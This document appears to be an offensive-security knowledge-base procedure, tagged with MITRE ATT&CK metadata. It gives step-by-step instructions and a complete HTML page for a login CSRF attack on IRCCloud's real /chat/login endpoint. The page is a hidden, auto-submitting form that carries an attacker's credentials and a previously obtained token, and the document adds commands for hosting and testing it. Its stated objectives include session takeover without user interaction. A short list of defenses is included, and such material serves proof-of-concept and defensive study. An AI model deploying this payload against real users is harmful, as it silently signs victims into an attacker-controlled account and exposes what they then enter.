---
tags:
  - csrf
  - html-form
  - web
type: procedure
tools: []
tactics:
  - '[[Initial Access]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-14T17:27:29.986Z'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques: []
id: 00e50baf-7cb7-412b-a2f1-9d437f00055e
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# Create-Malicious-Login-CSRF-Form

## Summary

This procedure constructs an HTML form that embeds the attacker's IRCCloud credentials and the anonymously obtained CSRF token, auto-submitting to the /chat/login endpoint to perform a login CSRF attack.

## Description

Using the token from the previous step, the form POSTs to IRCCloud's login endpoint with attacker details, bypassing CSRF checks due to the token's validity. When loaded in a victim's browser, it authenticates the victim as the attacker, potentially compromising their session if cookies or state are shared. This targets modern web browsers and requires hosting the HTML on an attacker-controlled domain.

## Requirements

1. Valid CSRF token from prior procedure
2. Attacker's IRCCloud email and password
3. Web hosting for the HTML file (e.g., local server or public URL)

## Defense

Defensive measures and detection strategies:

- Bind CSRF tokens to user sessions and validate on submission
- Use double-submit cookie pattern for CSRF protection
- Log and alert on login attempts from mismatched referers or IPs

## Objectives

1. Forge a login request using valid token and credentials
2. Ensure cross-origin submission without user interaction
3. Enable session takeover upon victim access

## Instructions

### Step 1: Build the HTML Form

**Context**: Create a simple HTML page with hidden inputs for form data and JavaScript for auto-submission.

**Instructions**: Write the following HTML, replacing placeholders with real values:

```html
<!DOCTYPE html>
<html>
<head><title>Click Here</title></head>
<body>
  <h1>Loading...</h1>
  <form id="login-form" action="https://www.irccloud.com/chat/login" method="POST" style="display:none;">
    <input type="hidden" name="email" value="attacker@example.com">
    <input type="hidden" name="password" value="your_password_here">
    <input type="hidden" name="org_invite" value="">
    <input type="hidden" name="token" value="YOUR_OBTAINED_TOKEN_HERE">
    <input type="hidden" name="_reqid" value="2">
  </form>
  <script>document.getElementById('login-form').submit();</script>
</body>
</html>
```

Save as csrf-poc.html.

### Step 2: Host and Test the Form

**Context**: Serve the file and verify submission in a test browser.

**Instructions**: Use a local server like Python's http.server:

```bash
python3 -m http.server 8000
```

Visit http://localhost:8000/csrf-poc.html in a browser. Check network tab for POST to /chat/login.

> Successful test shows 200 OK or redirect to dashboard, indicating login.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]] Initial Access

### Techniques

- [[Exploit Public-Facing Application]] Exploit Public-Facing Application

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- [[csrf]]
- [[Phishing]]
